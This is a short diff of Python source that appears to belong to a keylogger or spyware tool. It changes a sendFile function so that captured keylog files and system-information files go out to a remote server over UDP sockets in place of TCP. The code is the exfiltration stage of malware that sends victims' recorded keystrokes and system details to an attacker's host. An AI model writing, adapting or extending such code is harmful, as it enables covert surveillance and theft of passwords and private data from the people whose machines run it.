@@ -47,13 +47,13 @@ BLOCK_SIZE = 128
 
 ### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
 def sendFile(filename, isSysInfo):
-    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     f = open(filename, 'rb')
     if (not isSysInfo):
         sent_data = "incoming_keylog"
     else:
         sent_data = "incoming_sysinfo"
-    clientsocket.send(sent_data.encode())
+    clientsocket.sendto(sent_data.encode(), (server_ip, udpPort))
     l = f.read(buffer_size)
     while (l):
         clientsocket.sendto(l.encode(), (server_ip, udpPort))
